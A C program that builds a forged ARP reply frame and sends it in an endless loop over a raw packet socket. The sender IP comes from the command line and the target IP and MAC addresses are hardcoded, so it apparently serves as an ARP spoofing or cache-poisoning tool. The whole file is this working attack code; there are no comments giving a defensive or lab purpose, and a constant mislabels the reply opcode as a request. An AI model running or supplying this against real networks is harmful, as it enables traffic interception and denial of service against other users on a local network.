#include<netinet/ip.h>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<fcntl.h>
#include<arpa/inet.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<string.h>
#include<net/ethernet.h>
#include<net/if.h>
#include<sys/ioctl.h>
#include<bits/ioctls.h>
#include<linux/if_ether.h>
#include<linux/if_packet.h>

struct _arp_hdr {
  uint16_t htype;
  uint16_t ptype;
  uint8_t hlen;
  uint8_t plen;
  uint16_t opcode;
  uint8_t sender_mac[6];
  uint8_t sender_ip[4];
  uint8_t target_mac[6];
  uint8_t target_ip[4];
}arp;

// Define some constants.
#define ETH_HDRLEN 14      // Ethernet header length
#define IP4_HDRLEN 20      // IPv4 header length
#define ARP_HDRLEN 28      // ARP header length
#define ARPOP_REQUEST 2   // Taken from <linux/if_arp.h>

int main(int argc,char *argv[])
{
	char *interface = (char *)malloc(40*sizeof(char));
	char *src_ip = (char *)malloc(40*sizeof(char));
	char *target = (char *)malloc(100*sizeof(char));

	int frame_length;

	uint8_t *ether_frame = (uint8_t *)malloc(IP_MAXPACKET*sizeof(uint8_t));
	uint8_t *src_mac=(uint8_t *)malloc(6*sizeof(uint8_t));
	uint8_t *dest_mac=(uint8_t *)malloc(6*sizeof(uint8_t));


// stores source mac address
	src_mac[0] = 0x00;
	src_mac[1] = 0xe0;
	src_mac[2] = 0x4c;
	src_mac[3] = 0x53;
	src_mac[4] = 0x44;
	src_mac[5] = 0x58;

// stores the destination mac address
	dest_mac[0] = 0x00;
	dest_mac[1] = 0x25;
	dest_mac[2] = 0x83;
	dest_mac[3] = 0x70;
	dest_mac[4] = 0x10;
	dest_mac[5] = 0x00;


    
    struct sockaddr_in ipv4,ip4;


    struct sockaddr_ll device;
	
	strcpy(interface,"enx00e04c534458");

	int i;

	printf("MAC Address for interface %s is \n",interface);
	for(i=0;i<5;i++)
	{
		printf("%02x:",src_mac[i]);
	}
	printf("%02x\n", src_mac[5]);
 
  // Find interface index from interface name and store index in
  // struct sockaddr_ll device, which will be used as an argument of sendto().

	memset(&device,0,sizeof(device));
	if((device.sll_ifindex = if_nametoindex(interface))==0)
	{
		printf("Error to obtain interface index\n");
	}

	printf ("Index for interface %s is %i\n", interface, device.sll_ifindex);

	strcpy(target,"172.30.104.1");
	inet_pton(AF_INET,target,&ipv4.sin_addr);
    memcpy (&arp.target_ip, &ipv4.sin_addr, 4 * sizeof (uint8_t));

    
    strcpy(src_ip,argv[1]);
	inet_pton(AF_INET,src_ip,&ip4.sin_addr);
    memcpy (&arp.sender_ip, &ip4.sin_addr, 4 * sizeof (uint8_t));


    memcpy (&arp.sender_mac, src_mac, 6 * sizeof (uint8_t));

    memcpy (&arp.target_mac, dest_mac, 6 * sizeof (uint8_t));

      device.sll_family = AF_PACKET;
 	  memcpy (device.sll_addr, dest_mac, 6 * sizeof (uint8_t));
	  device.sll_halen = 6;


  // Hardware type (16 bits): 1 for ethernet
    arp.htype = htons (1);

  // Protocol type (16 bits): 2048 for IP
    arp.ptype = htons (ETH_P_IP);

  // Hardware address length (8 bits): 6 bytes for MAC address
    arp.hlen = 6;

  // Protocol address length (8 bits): 4 bytes for IPv4 address
    arp.plen = 4;

  // OpCode: 2 for ARP reply
    arp.opcode = htons (ARPOP_REQUEST);

    frame_length = 6 + 6 + 2 + ARP_HDRLEN;
    
    memcpy (ether_frame, dest_mac, 6 * sizeof (uint8_t));
    memcpy (ether_frame + 6, src_mac, 6 * sizeof (uint8_t));

    ether_frame[12] = ETH_P_ARP / 256;
    ether_frame[13] = ETH_P_ARP % 256;

    memcpy (ether_frame + ETH_HDRLEN, &arp, ARP_HDRLEN * sizeof (uint8_t));

    int sd;
  	if ((sd = socket (PF_PACKET, SOCK_RAW, htons (ETH_P_ALL))) < 0) {
    	perror ("socket() failed ");
    	exit (EXIT_FAILURE);
  		}
  	int bytes;
  	while(1)
  	{
    if ((bytes = sendto (sd, ether_frame, frame_length, 0, (struct sockaddr *) &device, sizeof (device))) <= 0) {
    	perror ("sendto() failed");
    	exit (EXIT_FAILURE);
  		}
  	}
	return 0;
}